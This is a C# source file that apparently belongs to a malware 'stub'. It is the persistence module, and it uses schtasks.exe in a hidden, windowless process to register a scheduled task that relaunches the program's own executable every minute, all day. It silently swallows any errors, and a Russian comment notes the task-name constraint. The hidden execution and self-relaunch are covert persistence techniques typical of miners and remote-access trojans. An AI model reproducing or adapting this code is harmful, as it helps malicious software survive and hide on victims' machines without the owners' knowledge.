using Stub.Help;
using System;
using System.Diagnostics;

namespace Stub.Startup
{
    class TaskCreat
    {
        public static void Set()
        {
            try
            {
                if (Config.autoRun_Scheduler)
                {
                    // В имени задачи недолжно быть пробелов
                    string arguments = string.Concat(new string[]
                    {
                      "/create /tn " + Config.taskName + " /tr \"", HELP_String.workFile.FullName, "\" /st ", DateTime.Now.AddMinutes(5.0).ToString("HH:mm"), " /du 23:59 /sc daily /ri 1 /f"
                    });
                    Process.Start(new ProcessStartInfo
                    {
                        Arguments = arguments,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                        FileName = "schtasks.exe",
                        RedirectStandardOutput = true,
                        UseShellExecute = false
                    });
                }
            }
            catch
            {
            }
        }
    }
}
